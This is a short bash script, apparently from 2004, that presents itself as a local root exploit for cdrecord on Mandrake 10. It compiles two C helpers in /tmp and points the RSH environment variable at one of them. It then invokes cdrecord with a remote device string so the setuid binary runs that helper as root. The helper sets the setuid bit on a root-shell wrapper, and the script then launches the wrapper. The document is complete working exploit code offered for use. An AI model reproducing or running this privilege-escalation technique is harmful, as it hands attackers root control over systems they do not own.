#!/bin/bash

echo "cdr-exp.sh -- CDRecord local exploit ( Tested on cdrecord-2.01-0.a27.2mdk + Mandrake10)"
echo "Author    : newbug [at] chroot.org"
echo "IRC       : irc.chroot.org #chroot"
echo "Date      :09.09.2004"

cd /tmp
cat > s.c <<_EOF_
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>

int main()
{
        setuid(0);setgid(0);
        chown("/tmp/ss", 0, 0);
        chmod("/tmp/ss", 04755);

        return 0;
}

_EOF_

cat > ss.c <<_EOF_
#include <stdio.h>

int main()
{
        setuid(0);setgid(0);
        execl("/bin/bash","bash",(char *)0);

        return 0;
}
_EOF_

gcc -o s s.c
gcc -o ss ss.c

export RSH=/tmp/s
cdrecord  dev=REMOTE:newbug@brk.chroot.org:0,0,0 /blah/blah >/dev/null 2>&1
/tmp/ss
